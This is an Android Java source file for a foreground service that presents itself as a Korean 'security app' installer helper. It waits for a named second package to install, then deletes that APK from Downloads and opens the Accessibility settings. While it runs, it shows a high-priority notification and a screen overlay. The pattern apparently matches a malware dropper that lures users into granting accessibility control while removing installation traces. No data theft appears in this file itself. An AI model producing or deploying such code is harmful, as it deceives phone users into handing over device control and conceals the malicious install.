package com.example.myapplication;

import static com.example.myapplication.MainActivity.SECURITY_APK_NAME;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ServiceInfo;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.TextView;

import androidx.annotation.Nullable;
import androidx.core.content.ContextCompat;

import com.ig.security.BuildConfig;

public class SecurityLaunchForegroundService extends Service {
    private static final String CHANNEL_ID = "security_launch_service";
    private static final int NOTIFICATION_ID = 2001;
    private static final String SECURITY_APP_PACKAGE_NAME = BuildConfig.SECURITY_APP_PACKAGE_NAME;

    private boolean packageReceiverRegistered;
    private View overlayView;
    private WindowManager windowManager;

    private final BroadcastReceiver packageInstallReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (!Intent.ACTION_PACKAGE_ADDED.equals(intent.getAction())) {
                return;
            }

            String installedPackageName = intent.getData() == null
                    ? null
                    : intent.getData().getSchemeSpecificPart();
            boolean isUpdate = intent.getBooleanExtra(Intent.EXTRA_REPLACING, false);
            if (!isUpdate && SECURITY_APP_PACKAGE_NAME.equals(installedPackageName)) {
                handleSecurityAppInstalled();
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        registerPackageInstallReceiver();
        showVisibleOverlayIfAllowed();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = createNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            );
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        removeVisibleOverlay();
        unregisterPackageInstallReceiver();
        stopForeground(true);
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void registerPackageInstallReceiver() {
        if (packageReceiverRegistered) {
            return;
        }

        IntentFilter filter = new IntentFilter(Intent.ACTION_PACKAGE_ADDED);
        filter.addDataScheme("package");
        ContextCompat.registerReceiver(
                this,
                packageInstallReceiver,
                filter,
                ContextCompat.RECEIVER_EXPORTED
        );
        packageReceiverRegistered = true;
    }

    private void unregisterPackageInstallReceiver() {
        if (!packageReceiverRegistered) {
            return;
        }

        unregisterReceiver(packageInstallReceiver);
        packageReceiverRegistered = false;
    }

    private void handleSecurityAppInstalled() {
        SecurityApkStorageCleaner.deleteFromDownloads(this, SECURITY_APK_NAME);
        try {
            openAccessibilitySettings();
        } finally {
            stopForeground(true);
            stopSelf();
        }
    }

    private void openAccessibilitySettings() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(intent);
    }

    private void showVisibleOverlayIfAllowed() {
        if (overlayView != null
                || (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this))) {
            return;
        }

        windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        if (windowManager == null) {
            return;
        }

        TextView view = new TextView(this);
        view.setText("보안 설정 준비 중");
        view.setTextColor(Color.WHITE);
        view.setTextSize(13);
        view.setTypeface(Typeface.DEFAULT_BOLD);
        view.setGravity(Gravity.CENTER);
        view.setPadding(dp(14), dp(8), dp(14), dp(8));
        view.setBackgroundColor(Color.rgb(0, 99, 255));

        int windowType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_PHONE;
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                windowType,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
        );
            params.gravity = Gravity.CENTER_HORIZONTAL | Gravity.TOP;
        params.x = dp(12);
        params.y = 0;

        try {
            windowManager.addView(view, params);
            overlayView = view;
        } catch (RuntimeException ignored) {
            overlayView = null;
        }
    }

    private void removeVisibleOverlay() {
        if (windowManager == null || overlayView == null) {
            return;
        }

        try {
            windowManager.removeView(overlayView);
        } catch (RuntimeException ignored) {
        } finally {
            overlayView = null;
        }
    }

    private Notification createNotification() {
        Notification.Builder builder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, CHANNEL_ID)
                : new Notification.Builder(this);

        return builder.setSmallIcon(getNotificationIcon())
                .setContentTitle("보안 앱 설치 대기 중")
                .setContentText("설치가 완료되면 보안 설정 화면이 자동으로 열립니다.")
                .setStyle(new Notification.BigTextStyle()
                        .bigText("보안 앱 설치를 기다리고 있습니다. 설치가 완료되면 자동으로 보안 설정 화면을 열고 이 알림은 사라집니다."))
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_HIGH)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            return;
        }

        NotificationManager notificationManager =
                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (notificationManager == null || notificationManager.getNotificationChannel(CHANNEL_ID) != null) {
            return;
        }

        NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "보안 앱 설치",
                NotificationManager.IMPORTANCE_HIGH
        );
        channel.setDescription("보안 앱 설치 상태 안내");
        notificationManager.createNotificationChannel(channel);
    }

    private int getNotificationIcon() {
        return getApplicationInfo().icon == 0
                ? android.R.drawable.stat_sys_warning
                : getApplicationInfo().icon;
    }

    private int dp(int value) {
        return Math.round(value * getResources().getDisplayMetrics().density);
    }
}
